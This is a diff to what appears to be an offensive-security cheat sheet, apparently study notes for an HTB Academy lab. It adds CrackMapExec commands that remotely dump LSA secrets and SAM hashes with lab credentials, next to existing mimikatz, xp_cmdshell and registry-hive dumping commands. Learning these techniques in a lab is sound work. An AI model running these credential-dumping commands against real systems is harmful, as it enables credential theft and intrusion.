@@ -1061,6 +1061,15 @@ EXEC xp_cmdshell 'whoami';
 .\mimikatz.exe "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit"
 ```
 
+
+   Remote dumping With CrackMapExec 
+```
+local admin privileges.
+
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+```
+
    Dumping LSA with mimikatz
 ```
 reg save hklm\sam sam.hiv
